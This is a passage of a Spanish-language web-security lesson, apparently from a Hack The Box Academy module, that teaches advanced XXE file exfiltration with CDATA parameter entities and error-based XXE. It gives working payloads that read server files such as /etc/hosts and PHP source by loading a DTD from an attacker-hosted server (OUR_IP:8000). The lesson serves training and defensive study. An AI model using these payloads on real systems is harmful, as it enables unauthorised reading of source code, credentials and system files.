No todas las vulnerabilidades de XXE pueden ser fáciles de explotar, como hemos visto en la sección anterior. Algunos formatos de archivo pueden no ser legibles a través de XXE básico, mientras que en otros casos, la aplicación web puede no mostrar ningún valor de entrada en algunas instancias, por lo que podemos intentar forzarlo a través de errores.

---

## Advanced Exfiltration with CDATA

En la sección anterior, vimos cómo podíamos usar filtros PHP para codificar archivos fuente PHP, de manera que no rompieran el formato XML cuando se referenciaban, lo que (como vimos) nos impedía leer estos archivos. Pero, ¿qué pasa con otros tipos de aplicaciones web? Podemos utilizar otro método para extraer cualquier tipo de datos (incluidos datos binarios) para cualquier backend de aplicación web. Para generar datos que no se ajusten al formato XML, podemos envolver el contenido de la referencia del archivo externo con una etiqueta `CDATA` (por ejemplo, `<![CDATA[ FILE_CONTENT ]]>`). De esta manera, el analizador XML consideraría esta parte como datos sin procesar, que pueden contener cualquier tipo de datos, incluidos caracteres especiales.

Una forma sencilla de abordar este problema sería definir una entidad interna `begin` con `<![CDATA[`, una entidad interna `end` con `]]>`, y luego colocar nuestra entidad de archivo externo en medio, y debería considerarse como un elemento `CDATA`, de la siguiente manera:

```r
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
```

Después de eso, si referenciamos la entidad `&joined;`, debería contener nuestros datos escapados. Sin embargo, esto no funcionará, ya que XML impide unir entidades internas y externas, por lo que tendremos que encontrar una mejor manera de hacerlo.

Para evitar esta limitación, podemos utilizar `XML Parameter Entities`, un tipo especial de entidad que comienza con un carácter `%` y solo se puede usar dentro del DTD. Lo único de las entidades de parámetros es que si las referenciamos desde una fuente externa (por ejemplo, nuestro propio servidor), todas se considerarán como externas y se pueden unir, de la siguiente manera:

```r
<!ENTITY joined "%begin;%file;%end;">
```

Entonces, intentemos leer el archivo `submitDetails.php` almacenando primero la línea anterior en un archivo DTD (por ejemplo, `xxe.dtd`), alojándolo en nuestra máquina y luego refiriéndonos a él como una entidad externa en la aplicación web objetivo, de la siguiente manera:

```r
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Ahora, podemos referenciar nuestra entidad externa (`xxe.dtd`) y luego imprimir la entidad `&joined;` que definimos anteriormente, que debería contener el contenido del archivo `submitDetails.php`, de la siguiente manera:

```r
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
...
<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
```

Una vez que escribamos nuestro archivo `xxe.dtd`, lo alojemos en nuestra máquina y luego agreguemos las líneas anteriores a nuestra solicitud HTTP a la aplicación web vulnerable, finalmente podemos obtener el contenido del archivo `submitDetails.php`: ![php_cdata](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_php_cdata.jpg)

Como podemos ver, pudimos obtener el código fuente del archivo sin necesidad de codificarlo en base64, lo que ahorra mucho tiempo al revisar varios archivos en busca de secretos y contraseñas.

**Nota:** En algunos servidores web modernos, es posible que no podamos leer algunos archivos (como index.php), ya que el servidor web estaría evitando un ataque DOS causado por la auto-referencia de archivos/entidades (es decir, un bucle de referencia de entidad XML), como se mencionó en la sección anterior.

Este truco puede ser muy útil cuando el método básico de XXE no funciona o cuando se trata con otros marcos de desarrollo web. Trata de usar este truco para leer otros archivos.

---

## Error Based XXE

Otra situación en la que podemos encontrarnos es aquella en la que la aplicación web no genera ninguna salida, por lo que no podemos controlar ninguna de las entidades de entrada XML para escribir su contenido. En tales casos, estaríamos `a ciegas` ante la salida XML y, por lo tanto, no podríamos recuperar el contenido del archivo utilizando nuestros métodos habituales.

Si la aplicación web muestra errores de tiempo de ejecución (por ejemplo, errores de PHP) y no tiene un manejo adecuado de excepciones para la entrada XML, entonces podemos usar este fallo para leer la salida del exploit XXE. Si la aplicación web no escribe salida XML ni muestra errores, nos enfrentaríamos a una situación completamente ciega, que discutiremos en la siguiente sección.

Consideremos el ejercicio que tenemos en `/error` al final de esta sección, en el que ninguna de las entidades de entrada XML se muestra en la pantalla. Debido a esto, no tenemos ninguna entidad que podamos controlar para escribir la salida del archivo. Primero, intentemos enviar datos XML malformados y veamos si la aplicación web muestra algún error. Para hacerlo, podemos eliminar cualquiera de las etiquetas de cierre, cambiar una de ellas, para que no se cierre (por ejemplo, `<roo>` en lugar de `<root>`), o simplemente referenciar una entidad inexistente, como se muestra: ![cause_error](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_cause_error.jpg)

Vemos que, de hecho, hicimos que la aplicación web mostrara un error, y también reveló el directorio del servidor web, que podemos usar para leer el código fuente de otros archivos. Ahora, podemos explotar este fallo para exfiltrar el contenido del archivo. Para hacerlo, usaremos una técnica similar a la que usamos anteriormente. Primero, alojaremos un archivo DTD que contenga el siguiente payload:

```r
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

El payload anterior define la entidad de parámetro `file` y luego la une con una entidad que no existe. En nuestro ejercicio anterior, estábamos uniendo tres cadenas. En este caso, `%nonExistingEntity;` no existe, por lo que la aplicación web generaría un error diciendo que esta entidad no existe, junto con nuestra entidad `file;` unida como parte del error. Hay muchas otras variables que pueden causar un error, como una URI incorrecta o tener caracteres no válidos en el archivo referenciado.

Ahora, podemos llamar a nuestro script DTD externo y luego referenciar la entidad `error`, de la siguiente manera:

```r
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```

Una vez que alojemos nuestro script DTD como hicimos anteriormente y enviemos el payload anterior como nuestros datos XML (no es necesario incluir ningún otro dato XML), obtendremos el contenido del archivo `/etc/hosts` de la siguiente manera: ![exfil_error](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_exfil_error_2.jpg)

Este método también se puede usar para leer el código fuente de los archivos. Todo lo que tenemos que hacer es cambiar el nombre del archivo en nuestro script DTD para apuntar al archivo que queremos leer (por ejemplo, `"file:///var/www/html/submitDetails.php"`). Sin embargo, este método no es tan confiable como el método anterior para leer archivos fuente, ya que puede tener limitaciones de longitud y ciertos caracteres especiales aún pueden romperlo.